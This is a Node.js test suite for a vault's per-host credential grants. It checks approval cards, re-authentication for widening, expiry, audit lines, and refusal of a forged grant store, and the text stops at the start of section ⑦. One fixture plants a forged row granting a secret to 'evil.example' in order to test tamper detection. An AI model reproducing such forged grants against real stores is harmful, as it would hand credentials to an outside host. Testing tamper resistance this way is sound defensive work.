#!/usr/bin/env node
// WHO MAY USE A VAULT ENTRY WITH NO CARD (lane vault-use-grants — the owner 2026-10-27: 「每个密码请求都要我同意太麻烦了！能不能搞个
// 权限分配 + 自动 approve 机制（比如利用 decision api）？」 and 「我现在完全无法在 vault 里看到刚才建立的密码」). Fast tier. PURE
// src/vault-use-grant.js over the ONE grant model (src/grant-model.js, door `vault-use`), the ONE writer
// src/server/vault-use-grants.js into a REAL grants store, the REAL run door + paste door over a REAL vault engine and the REAL
// For-you store on a scratch dir, a fake `curl` in a read-only folder:
//   ① THE ROW — the door's settings (hosts: names / addresses / @entry, never a wildcard; until), the write's refusals by name
//   ② THE VERDICT — admits' membership (a conversation, a Task Group READ AT USE TIME, All agents, 除了, groups unreadable) + the
//      hosts (exact; a DNS name covers the names under it, an address only itself) + the end; destination_unknown /
//      outside_hosts name the member; ids stable across a widening; the plans (widen / revoke) and the «always» carry
//   ③ THE WRITER — hosts_required, a widening needs 验证是你 (a narrowing / ✕ is a click), every write through the store (its
//      audit line), the window notified (vault.contentsChanged)
//   ④ THE RUN DOOR — a cluster instance: a grant ⇒ NO card, run line allowedBy grant + the grant id, each use line its grant,
//      the counts («used N× by M conversations»); outside the hosts / a shell / an expired grant / another conversation ⇒ the
//      card (naming the standing approval and what is outside it); a Task Group grant follows the membership NOW
//   ⑤ «ALWAYS» WRITES A GRANT — the card's «Always» = this conversation × these hosts × the TTL (one member per entry); the next
//      run of ANOTHER shape to the same host asks nothing; a wider host's card names the grant, its «Always» widens it
//   ⑥ THE CARRY — data/vault-run.json's «always» rows (marked, verified) become members at the first read; the store keeps
//      none; a hostless / expired row is counted, not carried; a forged (unmarked) row carries nothing
//   ⑦ THE REQUEST DEFAULT — `--host` on a paste request: the card SAYS the conversation that asked will be allowed for those
//      hosts; the paste writes that grant (by 'request'), the entry records its hosts and who asked, the receipt tells the
//      agent; vault.requestGrantsRequester off ⇒ no line, no grant (the 8-hour run grant); a bad host / --host with --into
//      refused by name; deleting the entry removes its row
//   ⑧ THE SEARCH — case-insensitive over the label, the kind, the purpose, the hosts, the origin (the requesting
//      conversation's name), the id's prefix; a request-made entry under its kind with its origin; SEARCHED_FIELDS
//   ⑨ THE NOTIFY — the engine's ONE writer broadcasts ONE coalesced `vault-contents` (a counter, never a name or a value) per
//      turn of the loop: a paste, three puts, a delete; a grant write notifies too
//   ⑩ CONTROLS (patched copies, each RED): the run door without the short-circuit draws the card; a verdict that ignores the
//      hosts admits an outside host; a writer that skips 验证是你 widens on a click; the engine without the notify is silent
//   ⑪ THE POLICY JUDGE (R4, default OFF) over a STUB judge — never a vendor: the switch off ⇒ never asked (the card); a policy
//      set needs 验证是你; on + yes ⇒ it runs by: policy, recorded (For-you record, the row's line, the run line); no / an
//      unavailable judge / an error / no answer ⇒ the card, saying so (fail closed); a grant goes first; no policy ⇒ never
//      asked; the judge sees the card's facts, never the value; Revoke ⇒ that command asks again, the judge not asked; the
//      policy persists in the MARKED store (a forged one carries nothing; a 2.369.359 body still verifies); a control door
//      that runs on a judge's no is RED
// Run: node scripts/test-vault-use-grants.mjs
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { createRequire } from 'node:module';
import { scratch } from './scratch.mjs';
import { mutantCopies } from './mutant-copy.mjs';
const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
const GM = require(path.join(REPO, 'src/grant-model.js'));
const U = require(path.join(REPO, 'src/vault-use-grant.js'));
const VU = require(path.join(REPO, 'src/vault-use.js'));
const VI = require(path.join(REPO, 'src/vault-inventory.js'));
const VR = require(path.join(REPO, 'src/vault-run.js'));
const P = require(path.join(REPO, 'src/vault-paste.js'));
const VE = require(path.join(REPO, 'src/server/vault-engine.js'));
const VC = require(path.join(REPO, 'src/server/vault-contents.js'));
const GS = require(path.join(REPO, 'src/server/grants-store.js'));
const UG = require(path.join(REPO, 'src/server/vault-use-grants.js'));
const DOOR = require(path.join(REPO, 'src/server/vault-run-door.js'));
const PD = require(path.join(REPO, 'src/server/vault-paste-door.js'));
const { UserTodoManager } = require(path.join(REPO, 'src/user-todos.js'));
let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e !== undefined ? '\n    ' + (typeof e === 'string' ? e : JSON.stringify(e)).slice(0, 900) : '')); } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ROOT = scratch('vault-use-grants');
fs.rmSync(ROOT, { recursive: true, force: true }); fs.mkdirSync(ROOT, { recursive: true });
const PW = 'second password for the use-grants suite';
const RES = 'secrets:secret:abc1234567#secret';
const NOW = 1_800_000_000_000;

console.log('① THE ROW — the door, its settings, the write\'s refusals by name');
{
  ok(GM.DOORS.includes('vault-use') && GM.ENTRY_FIELDS['vault-use'].hosts === 'hosts' && GM.ENTRY_FIELDS['vault-use'].until === 'time', 'the door is the model\'s (DOORS) with its OWN settings: hosts + until');
  ok(JSON.stringify(GM.hostListOf(['UniFi.LAN.', '192.168.1.1', '[fe80::1]', '@entry', 'unifi.lan'])) === JSON.stringify(['unifi.lan', '192.168.1.1', 'fe80::1', '@entry']), 'hosts: lower-cased, a trailing dot / IPv6 brackets dropped, deduplicated, @entry kept', GM.hostListOf(['UniFi.LAN.', '192.168.1.1', '[fe80::1]', '@entry', 'unifi.lan']));
  const bad = [['*'], ['*.example.com'], ['any'], [''], [], 'example.com', ['a b'], ['http://x.com'], new Array(17).fill(0).map((_, i) => `h${i}.lan`)];
  ok(bad.every((h) => GM.hostListOf(h) === null || (Array.isArray(h) && h[0] === 'any' && GM.hostListOf(h) !== null)), 'never a wildcard: *, *.x, an empty list, a bare string, a URL, a space, 17 hosts ⇒ not a host list ("any" is a host NAME, not «any host»)', bad.map((h) => GM.hostListOf(h)));
  const w1 = GM.validateWrite('vault-use', RES, { to: [{ kind: 'conversation', key: 'cid-1', hosts: ['192.168.1.1'], until: NOW + 1000 }] });
  ok(w1.ok && w1.row.to[0].hosts[0] === '192.168.1.1' && w1.row.to[0].until === NOW + 1000, 'a member with hosts + until is written as it is');
  const w2 = GM.validateWrite('vault-use', RES, { to: [{ kind: 'conversation', key: 'cid-1', hosts: ['*'] }] });
  ok(!w2.ok && w2.code === 'bad_principal', 'a wildcard host refuses the member BY NAME (bad_principal) at the write', w2);
  const w3 = GM.validateWrite('vault-use', 'not an entry id', { to: [] });
  ok(!w3.ok && w3.code === 'bad_resource' && /vault entry id/.test(w3.error), 'a resource that is no vault entry id ⇒ bad_resource by name', w3);
  const n = GM.normRow({ door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', hosts: ['*'] }, { kind: 'conversation', key: 'cid-2', hosts: ['a.lan'] }], except: [] });
  ok(n.ok && n.row.to.length === 1 && n.row.to[0].key === 'cid-2', 'READ: a member whose hosts cannot be read is DROPPED (narrowing — never read as «any host»)', n);
}

console.log('② THE VERDICT — membership is the model\'s; hosts and the end are the door\'s');
{
  const row = { door: 'vault-use', resource: RES, to: [
    { kind: 'conversation', key: 'cid-1', hosts: ['192.168.1.1'] },
    { kind: 'group', id: 'T-net', hosts: ['example.com'], until: NOW + 60e3 },
    { kind: 'everyone', hosts: ['status.example.org'] },
  ], except: [{ kind: 'conversation', key: 'cid-left-out' }] };
  const run = (hosts, o = {}) => ({ hosts, destinationKnown: true, now: NOW, ...o });
  const v1 = U.useVerdict([row], { conversationKeys: ['cid-1'] }, run(['192.168.1.1']));
  ok(v1.ok && v1.via === 'conversation' && U.ID_RE.test(v1.id) && v1.id === U.grantIdOf(RES, 'conversation:cid-1'), 'its OWN member, the host it names ⇒ admitted, the grant\'s id named', v1);
  const v2 = U.useVerdict([row], { conversationKeys: ['cid-1'] }, run(['10.0.0.9']));
  ok(!v2.ok && v2.code === 'outside_hosts' && v2.missing.join() === '10.0.0.9' && v2.member && v2.member.id === v1.id, 'another host ⇒ outside_hosts — the member named (the card says it) and the host outside it', v2);
  const v3 = U.useVerdict([row], { conversationKeys: ['cid-1'] }, run(['192.168.1.1'], { destinationKnown: false }));
  ok(!v3.ok && v3.code === 'destination_unknown' && U.holds(v3), 'a shape whose destination cannot be told (shell / interpreter / config file / no host) ⇒ destination_unknown — it HOLDS the entry (open), but the card asks', v3);
  const v4 = U.useVerdict([row], { conversationKeys: ['cid-9'], groupIds: ['T-net'] }, run(['api.example.com']));
  ok(v4.ok && v4.via === 'group', 'a Task Group member (its groups as read NOW) ⇒ admitted; a DNS name covers the names under it (api.example.com under example.com)', v4);
  const v5 = U.useVerdict([row], { conversationKeys: ['cid-9'], groupIds: [] }, run(['api.example.com']));
  ok(!v5.ok && v5.code === 'outside_hosts' && v5.member.via === 'everyone', 'the same conversation once it LEFT the group: only All agents\' member admits it — another host ⇒ outside_hosts', v5);
  const v6 = U.useVerdict([row], { conversationKeys: ['cid-9'], groupIds: ['T-net'] }, run(['api.example.com'], { now: NOW + 61e3 }));
  ok(!v6.ok && v6.code === 'outside_hosts' && v6.member.via === 'everyone', 'past the group member\'s END it admits nothing (the next member decides)', v6);
  const v7 = U.useVerdict([row], { conversationKeys: ['cid-left-out'] }, run(['status.example.org']));
  ok(!v7.ok && v7.code === 'excepted' && !U.holds(v7), '除了: the member left out of All agents ⇒ excepted by name, holds nothing', v7);
  const grp = { door: 'vault-use', resource: RES, to: [{ kind: 'group', id: 'T-net', hosts: ['example.com'] }], except: [] };
  const v8 = U.useVerdict([grp], { conversationKeys: ['cid-9'], groupsUnreadable: true }, run(['example.com']));
  ok(!v8.ok && v8.code === 'groups_unreadable' && !U.holds(v8), 'the Task Group store unreadable ⇒ groups_unreadable (never «not in any group»), holds nothing', v8);
  const ip = { door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', hosts: ['168.1.1'] }], except: [] };
  ok(!U.useVerdict([ip], { conversationKeys: ['cid-1'] }, run(['192.168.1.1'])).ok && U.hostCovers('example.com', 'a.b.example.com') && !U.hostCovers('example.com', 'badexample.com') && !U.hostCovers('1.1', '192.168.1.1'), 'an address covers only itself; a name never covers a look-alike (badexample.com)');
  const ent = { door: 'vault-use', resource: RES, to: [{ kind: 'conversation', key: 'cid-1', hosts: ['@entry'] }], except: [] };
  ok(U.useVerdict([ent], { conversationKeys: ['cid-1'] }, run(['unifi.lan'], { entryHosts: ['unifi.lan'] })).ok && !U.useVerdict([ent], { conversationKeys: ['cid-1'] }, run(['unifi.lan'], { entryHosts: [] })).ok, '@entry = the hosts the entry was stored for, read at use time (none ⇒ it covers nothing)');
  const none = U.useVerdict([], { conversationKeys: ['cid-1'] }, run(['192.168.1.1']));
  ok(!none.ok && none.code === 'not_granted' && !U.holds(none), 'no row ⇒ not_granted');
  const wd = U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: ['10.0.0.9'], until: NOW + 5 });
  ok(wd.ok && wd.widened && !wd.added && wd.to.find((e) => e.key === 'cid-1').hosts.join() === '192.168.1.1,10.0.0.9' && !('until' in wd.to.find((e) => e.key === 'cid-1')), 'WIDEN: hosts ∪, the later end (no end wins — a 30-day «Always» never shortens a grant with no end)', wd);
  const wd2 = U.withMember(row, { kind: 'conversation', key: 'cid-left-out' }, { hosts: ['a.lan'] });
  ok(wd2.ok && wd2.added && !wd2.except.length, 'adding a member takes it out of 除了');
  ok(!U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: [] }).ok && U.withMember(row, { kind: 'conversation', key: 'cid-1' }, { hosts: [] }).code === 'hosts_required', 'a member with no host ⇒ hosts_required (never «any host»)');
  const rv = U.withoutMember(row, 'conversation:cid-1');
  ok(rv.ok && rv.removed && rv.to.length === 2 && rv.except.length === 1, 'REVOKE one member — the others and the exceptions stay');
  ok(U.grantIdOf(RES, 'conversation:cid-1') === U.grantIdOf(RES, 'conversation:cid-1') && U.grantIdOf(RES, 'conversation:cid-1') !== U.grantIdOf(RES, 'conversation:cid-2'), 'the id: the same member of the same entry keeps it (across a widening); another member has its own');
  const key = (hosts) => `${VR.SHAPE_V}:${JSON.stringify(['/usr/bin/curl', [], [], [], hosts, [], [], [], [], null, null, []])}`;
  const c = U.alwaysCarry([{ conv: 'cid-1', key: key(['api.x.com']), until: null, entries: [RES] }, { conv: 'cid-1', key: key([]), until: null, entries: [RES] }, { conv: 'cid-2', key: key(['b.lan']), until: NOW - 1, entries: [RES] }], { now: NOW });
  ok(c.members.length === 1 && c.members[0].hosts.join() === 'api.x.com' && c.members[0].principal.key === 'cid-1' && c.hostless === 1 && c.expired === 1, 'THE CARRY: an «always» row → a member (the conversation × the shape key\'s hosts); hostless and expired rows are counted, not carried', c);
  const sl = U.standingLines([v2], { always: true });
  ok(sl.length === 1 && sl[0].includes(v1.id) && sl[0].includes('192.168.1.1') && sl[0].includes('outside it: 10.0.0.9') && /widens it to 10\.0\.0\.9/.test(sl[0]), 'the card\'s line: «a standing approval exists … this run is outside it: host Y» + «Always» widens it', sl);
}

// ── A WORLD: a real engine (set up, unlocked), a real grants store on disk, the ONE writer, the run door (a CLUSTER instance:
// every run without a standing approval draws its card), the paste door, a fake `curl` in a read-only folder ──
const BIN = path.join(ROOT, 'bin');
fs.mkdirSync(BIN, { recursive: true });
fs.writeFileSync(path.join(BIN, 'curl'), `#!/usr/bin/env node\nprocess.stdout.write('curl got ' + process.env.T + ' for ' + process.argv.slice(2).join(' ') + '\\n');\n`, { mode: 0o555 });
fs.chmodSync(BIN, 0o555);   // read-only: the door's programWritable is false (an «Always» / a grant is possible)
process.on('exit', () => { try { fs.chmodSync(BIN, 0o755); fs.rmSync(ROOT, { recursive: true, force: true }); } catch { } });
const VALUE = ['unifi', 'admin', 'value', crypto.randomBytes(6).toString('hex')].join('-');
const LABEL = 'UniFi UCG-Fiber admin (192.168.1.1)';
let worldN = 0;
async function world({ instance = 'cluster', groups = new Map(), setting = {}, doorMod = DOOR, ugMod = UG, engineMod = VE, judge = null, judgeOn = () => false } = {}) {
  const dir = path.join(ROOT, 'w' + (++worldN)); const dataDir = path.join(dir, 'data'), work = path.join(dir, 'work'), runRoot = path.join(dir, 'run');
  for (const d of [dataDir, work, runRoot]) fs.mkdirSync(d, { recursive: true });
  const frames = [];
  const vault = engineMod.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: { log() {}, warn() {} }, idleTimer: false, register: false, bcast: (m) => frames.push(m) });
  await vault.setup(PW);
  const userTodos = new UserTodoManager({ dataDir, expirySweepMs: 3600e3 });
  const grants = GS.create({ dataDir });
  const logs = [];
  const useGrants = ugMod.create({ grants: () => grants, vault, log: (m) => logs.push(String(m)) });
  const sources = { secrets: () => VC.secretSource({ vault }) };
  const facts = (caller) => ({ conversationKeys: [caller.conversationId], groupIds: groups.get(caller.conversationId) || [] });
  const mk = (mod = doorMod) => mod.create({ dataDir, vault, userTodos, sources, instanceKind: () => instance, runRoot: () => runRoot, home: os.homedir(), agentEnv: () => ({ ...process.env, PATH: BIN + ':' + process.env.PATH }), killGraceMs: 400, pipeGraceMs: 300, liveOf: () => true, log: (m) => logs.push(String(m)), useGrants, useFacts: facts, policyJudge: judge, policyOn: judgeOn });
  const door = mk();
  const stash = [];
  const paste = PD.create({ vault, userTodos, vaultRun: door, useGrants, setting: (k) => setting[k], deliver: { stashFor: (cid, env) => { stash.push({ cid, ...env }); return { stored: true }; } }, log: (m) => logs.push(String(m)) });
  const caller = (cid = 'cid-asker-1', name = 'Home network') => ({ conversationId: cid, sessionKey: `claude:${cid}`, name, cwd: work, scope: cid });
  return { dir, dataDir, work, runRoot, vault, userTodos, grants, useGrants, door, paste, logs, frames, stash, groups, setting, mk, caller, contents: VC.create({ vault, sources, runFacts: (row) => door.rowFacts(row) }) };
}
const cardsOf = (w) => (w.userTodos.snapshot().open || []).filter((i) => i.action && i.action.type === 'vault-run-ask');
/** A run whose card (if one comes) is answered `answer`. → { r, card, a } */
async function runAnswered(w, args, { answer = 'deny', reauthed = false, door = w.door, caller = w.caller(), ttl } = {}) {
  let settled = false;
  const p = door.run({ caller, args, cwd: w.work }).then((r) => { settled = true; return r; });
  let card = null;
  const t = Date.now();
  while (!settled && Date.now() - t < 3000) { const c = cardsOf(w); if (c.length) { card = c[c.length - 1]; break; } await sleep(5); }
  let a = null;
  if (card && answer) a = door.answer(card.action.askId, { answer, reauthed, ...(ttl ? { ttl } : {}) });
  if (card && a && !a.ok) door.answer(card.action.askId, { answer: 'deny' });   // a refused answer leaves the card up — settle it (the run returns)
  return { r: await p, card, a };
}
const auditOf = (w) => { try { return fs.readFileSync(path.join(w.dataDir, 'vault-audit.jsonl'), 'utf8'); } catch { return ''; } };
const linesOf = (w, ev) => auditOf(w).split('\n').filter(Boolean).map((l) => JSON.parse(l)).filter((x) => x.event === ev);
const grantAudit = (w) => { try { return fs.readFileSync(path.join(w.dataDir, 'grants-audit.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
/** A free entry the owner stored (the engine's ONE writer), its row id and its reference. */
function entryOf(w, { label = LABEL, hosts = [] } = {}) {
  const name = 'secret:' + crypto.randomBytes(5).toString('hex');
  const r = w.vault.secretPut(name, VALUE, { prov: 'owner', label, kind: 'password', hosts });
  if (!r.ok) throw new Error('secretPut ' + r.code);
  return { name, id: `secrets:${name}#secret`, ref: `vault://secrets/${name}/secret` };
}
const CURL = (ref, ...rest) => ['--env', `T=${ref}`, '--', 'curl', ...rest];
const ROW = (w, e) => w.useGrants.rowsOf(e.id)[0] || null;
const contentsFrames = (w) => w.frames.filter((m) => m && m.type === 'vault-contents');

console.log('③ THE WRITER — hosts required, a widening needs 验证是你, every write through the store, the window told');
{
  const w = await world();
  const e = entryOf(w);
  const m = { kind: 'conversation', key: 'cid-asker-1', hosts: ['192.168.1.1'] };
  const r0 = w.useGrants.setRow(e.id, { to: [{ kind: 'conversation', key: 'cid-asker-1' }] }, { reauthed: true });
  ok(!r0.ok && r0.code === 'hosts_required' && /never «any host»/.test(r0.error) && !ROW(w, e), 'a member with no host ⇒ hosts_required by name — nothing written (never «any host»)', r0);
  const r1 = w.useGrants.setRow(e.id, { to: [m] }, { reauthed: false });
  ok(!r1.ok && r1.code === 'reveal_needs_password' && !ROW(w, e), 'a NEW member on a click alone ⇒ reveal_needs_password (the second password again, as the run switch) — nothing written', r1);
  const f0 = contentsFrames(w).length;
  const r2 = w.useGrants.setRow(e.id, { to: [m] }, { reauthed: true });
  await sleep(10);
  ok(r2.ok && ROW(w, e) && ROW(w, e).to[0].hosts.join() === '192.168.1.1', 'with 验证是你: the row is written', r2);
  ok(grantAudit(w).some((l) => l.door === 'vault-use' && l.resource === e.id && l.to.added.includes('conversation:cid-asker-1')), 'THROUGH THE ONE WRITER: the grants store\'s audit line names the door, the entry and who was added (data/grants-audit.jsonl)');
  ok(contentsFrames(w).length === f0 + 1, 'the write notifies the Vault window (ONE vault-contents frame)', contentsFrames(w).length - f0);
  const r3 = w.useGrants.setRow(e.id, { to: [{ ...m, hosts: ['192.168.1.1', '10.0.0.9'] }] }, { reauthed: false });
  ok(!r3.ok && r3.code === 'reveal_needs_password', 'a NEW HOST on a click ⇒ reveal_needs_password (a widening)', r3);
  const r4 = w.useGrants.setRow(e.id, { to: [{ ...m, until: Date.now() + 3600e3 }] }, { reauthed: false });
  ok(r4.ok && ROW(w, e).to[0].until > Date.now(), 'an END set on a member with none = a NARROWING ⇒ a click is enough', r4);
  const r5 = w.useGrants.setRow(e.id, { to: [{ ...m }] }, { reauthed: false });
  ok(!r5.ok && r5.code === 'reveal_needs_password', 'the end taken away again (no end = later) ⇒ a widening ⇒ 验证是你', r5);
  const r6 = w.useGrants.revoke(e.id, 'conversation:cid-asker-1');
  ok(r6.ok && r6.removed && !ROW(w, e), '✕ = revoke: a click — the last member gone, the row is gone (no row = nobody)', r6);
}

console.log('④ THE RUN DOOR — a standing approval: no card; outside it: the card, naming it');
const W4 = await world();
const E4 = entryOf(W4);
{
  const w = W4, e = E4;
  const g = w.useGrants.addMember(e.id, { kind: 'conversation', key: 'cid-asker-1', name: 'Home network' }, { hosts: ['192.168.1.1'] });
  ok(g.ok && U.ID_RE.test(g.grant), 'the member: this conversation × 192.168.1.1', g);
  const { r, card } = await runAnswered(w, CURL(e.ref, '-sk', 'https://192.168.1.1/api/auth/login'));
  ok(r.ok && r.by === 'grant' && !card && !cardsOf(w).length, 'a CLUSTER instance (every run asks): the granted run goes with NO card — by: grant', { by: r.by, code: r.code, card: !!card });
  ok(r.ok && /^curl got \[vault:secrets\//.test(r.stdout) && !r.stdout.includes(VALUE), 'the output is scrubbed as every run\'s (the value never reaches the agent)', r.stdout);
  const rl = linesOf(w, 'vault-run').filter((l) => l.outcome === 'ran').pop();
  ok(rl && rl.allowedBy === 'grant' && Array.isArray(rl.grants) && rl.grants[0] === g.grant, 'its run line: allowedBy grant + the grant\'s id', rl && { allowedBy: rl.allowedBy, grants: rl.grants });
  const ul = linesOf(w, 'vault-use').pop();
  ok(ul && ul.outcome === 'ok' && ul.grant === g.grant && ul.door === 'run' && ul.conv === 'cid-asker-1', 'its use line names the grant (the use law\'s ONE writer)', ul);
  await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/api/stat/health'));
  await runAnswered(w, CURL(e.ref, '-X', 'POST', 'https://192.168.1.1/api/s/default/cmd'));
  const pub = w.door.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' }).use;
  const mine = pub && pub.to.find((x) => x.id === g.grant);
  ok(mine && mine.uses === 3 && mine.convs === 1 && pub.used.uses === 3 && pub.used.convs === 1, 'the window\'s row: «used 3× by 1 conversation» on the member, and on the entry', pub);
  const out = await runAnswered(w, CURL(e.ref, 'https://10.0.0.9/'));
  ok(out.card && !out.r.ok && out.r.code === 'ask_denied', 'ANOTHER host ⇒ the card (today\'s) — denied here', { card: !!out.card, code: out.r.code });
  ok(out.card && out.card.detail.includes(`A standing approval exists for this conversation (${g.grant}: 192.168.1.1) — this run is outside it: 10.0.0.9.`) && /«Always» widens it to 10\.0\.0\.9/.test(out.card.detail), 'the card NAMES the standing approval and what is outside it (host 10.0.0.9) — and that «Always» widens it', out.card && out.card.detail);
  const sh = await runAnswered(w, ['--env', `T=${e.ref}`, '--', 'sh', '-c', 'curl https://192.168.1.1/']);
  ok(sh.card && sh.card.detail.includes('where this run sends it cannot be told'), 'a SHELL (its destination cannot be told) ⇒ the card — naming the standing approval it cannot apply', sh.card && sh.card.detail.split('\n').slice(-3));
  const other = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'), { caller: w.caller('cid-other-2', 'Other lane') });
  ok(!other.r.ok && other.r.code === 'entry_not_runnable' && !other.card, 'ANOTHER conversation (no member, the switch off) ⇒ entry_not_runnable — today\'s answer, no card', other.r.code);
  w.groups.set('cid-group-3', ['T-net']);
  w.useGrants.setRow(e.id, { to: [...ROW(w, e).to, { kind: 'group', id: 'T-net', name: 'Home lab', hosts: ['192.168.1.1'] }] }, { reauthed: true });
  const gr = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'), { caller: w.caller('cid-group-3', 'Lab helper') });
  ok(gr.r.ok && gr.r.by === 'grant' && !gr.card, 'a TASK GROUP member ⇒ no card (the group\'s membership read at the use)', { by: gr.r.by, code: gr.r.code });
  w.groups.set('cid-group-3', []);
  const gone = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'), { caller: w.caller('cid-group-3', 'Lab helper') });
  ok(!gone.r.ok && gone.r.code === 'entry_not_runnable', '… it LEFT the group ⇒ the grant no longer reaches it (never copied onto the grant)', gone.r.code);
  w.useGrants.setRow(e.id, { to: ROW(w, e).to.map((x) => (x.key === 'cid-asker-1' ? { ...x, until: Date.now() - 1 } : x)) }, { reauthed: false });
  const ex = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'));
  ok(!ex.r.ok && ex.r.code === 'entry_not_runnable', 'past its END the member opens nothing (the entry closed for it again)', ex.r.code);
  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
  const sw = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/'));
  ok(sw.card && !sw.r.ok && sw.r.code === 'ask_denied', 'the switch on («every conversation») with no live member ⇒ the card — as before this lane', sw.r.code);
}

console.log('⑤ «ALWAYS» WRITES A GRANT — this conversation × these hosts; a wider host widens it');
{
  const w = await world();
  const e = entryOf(w);
  w.door.setRunnable({ id: e.id, on: true, reauthed: true });
  const a0 = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/api/auth/login'), { answer: 'always', reauthed: false });
  ok(a0.card && a0.a && a0.a.code === 'reveal_needs_password', '«Always» on a click alone ⇒ reveal_needs_password (unchanged — the card stays)', a0.a);
  const a1 = await runAnswered(w, CURL(e.ref, 'https://192.168.1.1/api/auth/login'), { answer: 'always', reauthed: true });
  ok(a1.card && a1.card.action.always === true && a1.card.detail.includes('«Always» = a standing approval: this conversation may use this secret for 192.168.1.1 without asking'), 'the card says what «Always» is: a standing approval for these hosts (the Vault window lists it)', a1.card && a1.card.detail.split('\n').slice(-2));
  ok(a1.a && a1.a.ok && a1.r.ok && a1.r.by === 'always', '«Always» with 验证是你 ⇒ allowed, it runs', { a: a1.a, by: a1.r.by });
  const row = ROW(w, e), m = row && row.to.find((x) => x.key === 'cid-asker-1');
  ok(m && m.hosts.join() === '192.168.1.1' && Math.abs(m.until - (Date.now() + VR.ALWAYS_TTLS['30d'])) < 60e3 && m.name === 'Home network', '… and it WROTE a vault-use member: this conversation × 192.168.1.1 × 30 days (the TTL), the same row «Who may use it…» edits', m);
  ok(!JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8')).always.length, 'data/vault-run.json keeps NO «always» row — ONE mechanism');
  const n1 = await runAnswered(w, CURL(e.ref, '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 'https://192.168.1.1/api/s/default/stat/device'));
  ok(n1.r.ok && n1.r.by === 'grant' && !n1.card, 'the next run of ANOTHER shape to the same host asks NOTHING (a cluster) — the base asked again for every new shape', { by: n1.r.by, card: !!n1.card });
  const wide = await runAnswered(w, CURL(e.ref, 'https://192.168.1.2/'), { answer: 'always', reauthed: true });
  const id = U.grantIdOf(e.id, 'conversation:cid-asker-1');
  ok(wide.card && wide.card.detail.includes(`(${id}: 192.168.1.1) — this run is outside it: 192.168.1.2`), 'a wider host\'s card names the grant and what is outside it', wide.card && wide.card.detail.split('\n').filter((l) => /standing/.test(l)));
  const m2 = ROW(w, e).to.find((x) => x.key === 'cid-asker-1');
  ok(wide.r.ok && m2.hosts.join() === '192.168.1.1,192.168.1.2' && U.grantIdOf(e.id, 'conversation:cid-asker-1') === id, 'its «Always» WIDENS the same member (hosts ∪ — the same grant id)', m2);
  const al = linesOf(w, 'vault-run-always').pop();
  ok(al && Array.isArray(al.grants) && al.grants[0] === id && al.hosts.join() === '192.168.1.2', 'the «always» audit line names the grant and the hosts', al);
}

console.log('⑥ THE CARRY — the old «always» rows become members at the first verified read');
{
  const w = await world();
  const e = entryOf(w);
  const key = (hosts) => VR.shapeKeyOf({ tool: '/usr/bin/curl', sub: [], flags: ['-s'], args: ['url'], hosts, entries: [e.ref], injection: ['env:T'], env: [], templates: [], on: null, script: null, keyed: [] });
  const t = Date.now();
  const always = [
    { conv: 'cid-asker-1', key: key(['api.unifi.lan']), until: null, entries: [e.id], at: t, by: 'user' },
    { conv: 'cid-asker-1', key: key([]), until: null, entries: [e.id], at: t, by: 'user' },
    { conv: 'cid-old-9', key: key(['old.lan']), until: t - 1000, entries: [e.id], at: t, by: 'user' },
  ].sort((a, b) => (a.conv + a.key).localeCompare(b.conv + b.key));
  const body = JSON.stringify({ v: 1, gen: 7, runnable: [e.id], always });
  fs.writeFileSync(path.join(w.dataDir, DOOR.STORE_FILE), JSON.stringify({ ...JSON.parse(body), mark: w.vault.macOf(DOOR.MARK_LABEL, body) }));
  const d2 = w.mk();
  ok(!ROW(w, e), 'before the first read: no member (the marked store can be judged only unlocked, by the door)');
  const f = d2.rowFacts({ id: e.id, store: 'secrets', entry: e.name, field: 'secret' });
  const m = ROW(w, e) && ROW(w, e).to.find((x) => x.key === 'cid-asker-1');
  ok(f.open === true && m && m.hosts.join() === 'api.unifi.lan' && !('until' in m), 'the first verified read CARRIES the «always» row: this conversation × the shape key\'s host, no end — the switch stays', { m, open: f.open });
  ok(grantAudit(w).some((l) => l.door === 'vault-use' && l.by === 'migration'), 'through the ONE writer, by: migration');
  const st = JSON.parse(fs.readFileSync(path.join(w.dataDir, DOOR.STORE_FILE), 'utf8'));
  ok(st.always.length === 0 && st.runnable.includes(e.id), 'the store keeps NO «always» row after the carry (re-marked) — ONE mechanism');
  const cl = linesOf(w, 'vault-run-always-carried').pop();
  ok(cl && cl.carried === 1 && cl.hostless === 1 && cl.expired === 1 && cl.saved === true, 'ONE audit line: 1 carried, 1 with no host, 1 expired', cl);
  const w2 = await world();
  const e2 = entryOf(w2);
  fs.writeFileSync(path.join(w2.dataDir, DOOR.STORE_FILE), JSON.stringify({ v: 1, gen: 7, runnable: [e2.id], always: [{ conv: 'cid-asker-1', key: key(['evil.example']), until: null, entries: [e2.id], at: t, by: 'user' }], mark: 'f'.repeat(64) }));
  w2.mk().rowFacts({ id: e2.id, store: 'secrets', entry: e2.name, field: 'secret' });
  ok(!ROW(w2, e2) && linesOf(w2, 'vault-run-store-refused').length === 1, 'a FORGED store (an agent shares the uid and can write the file — its mark does not verify) carries NOTHING');
}

console.log('⑦ THE REQUEST DEFAULT — the conversation that asked × the hosts it named');
{
  const w = await world();
  const c = w.caller();
